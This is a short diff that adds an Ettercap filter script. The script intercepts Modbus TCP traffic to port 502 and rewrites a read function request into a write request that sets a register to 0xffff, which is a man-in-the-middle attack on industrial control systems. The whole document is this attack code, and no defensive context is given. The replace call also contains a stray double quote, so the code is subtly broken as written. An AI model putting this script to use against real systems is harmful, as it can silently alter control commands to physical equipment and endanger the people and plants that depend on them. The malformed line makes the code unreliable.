@@ -1,0 +1,7 @@
+﻿if(ip.proto == TCP && tcp.src == 34738 && tcp.dst == 502) {
+ if(search(DATA.data, "\x03\x04\x14\x00\x0a")){
+   msg("Found Modbus Read Function code");
+   replace(""\x03\x04\x14\x00\x0a", "\x06\x04\x14\xff\xff");
+   msg("Replaced Modbus Read Function with Write Function Code");
+  }
+}
